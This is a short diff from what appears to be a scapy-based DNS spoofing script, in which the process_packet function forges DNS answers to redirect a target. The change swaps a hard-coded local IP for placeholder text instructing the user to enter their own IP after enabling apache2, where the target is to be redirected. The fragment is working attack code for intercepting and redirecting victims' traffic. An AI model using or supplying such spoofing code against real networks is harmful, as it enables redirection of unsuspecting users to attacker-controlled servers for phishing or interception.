@@ -15,7 +15,7 @@ def process_packet(packet):
             print("[+] Spoofing target")
 
             # Craft the spoofed DNS response
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.114")
+            answer = scapy.DNSRR(rrname=qname, rdata="Enter your IP address After Enabling apache2./ Where you want to redirect the target")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
